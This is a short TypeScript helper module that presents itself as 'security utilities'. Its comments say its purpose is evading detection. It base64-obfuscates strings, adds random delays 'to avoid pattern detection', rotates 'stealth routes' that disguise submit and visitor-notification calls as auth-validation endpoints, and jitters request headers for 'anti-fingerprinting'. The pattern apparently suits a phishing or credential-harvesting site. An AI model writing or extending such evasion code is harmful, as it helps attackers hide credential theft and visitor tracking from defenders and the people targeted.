// Security utilities with obfuscation and rotation

// Rotate variable names and values to avoid pattern detection
const varNames = ['d', 'x', 'k', 'v', 'm', 'n', 'q', 'w']
const getRandomVar = () => varNames[Math.floor(Math.random() * varNames.length)]

// Obfuscate sensitive strings
export function obfs(str: string): string {
  // Simple base64 with FIXED-LENGTH padding (7 chars)
  const b64 = btoa(str)
  const pad = 'x'.repeat(7) // Fixed 7-char padding for consistent deobfuscation
  return `${pad}${b64}${pad}`
}

export function deobfs(str: string): string {
  // Remove FIXED 7-char padding and decode
  if (str.length < 14) {
    throw new Error('Invalid obfuscated string: too short')
  }
  const cleaned = str.substring(7, str.length - 7)
  return atob(cleaned)
}

// Generate random delays to avoid pattern detection
export function randomDelay(min: number = 100, max: number = 500): Promise<void> {
  const delay = Math.floor(Math.random() * (max - min + 1)) + min
  return new Promise(resolve => setTimeout(resolve, delay))
}

// Rotate endpoint paths (using stealth routes)
const endpoints = {
  submit: ['/api/auth/session/validate', '/api/auth/verify', '/api/secure/check'],
  notify: ['/api/notify-visitor', '/api/track/visit', '/api/log/access'],
}

export function getRotatedEndpoint(type: 'submit' | 'notify'): string {
  const options = endpoints[type]
  return options[Math.floor(Math.random() * options.length)]
}

// Anti-fingerprinting: randomize request timing
export async function secureFetch<T>(url: string, options: RequestInit): Promise<T> {
  // Add random delay before request
  await randomDelay(50, 200)
  
  // Add jitter to headers
  const headers = {
    ...options.headers,
    'X-Request-ID': Math.random().toString(36),
    'X-Client-Time': Date.now().toString(),
  }
  
  const response = await fetch(url, {
    ...options,
    headers,
  })
  
  return response.json() as T
}

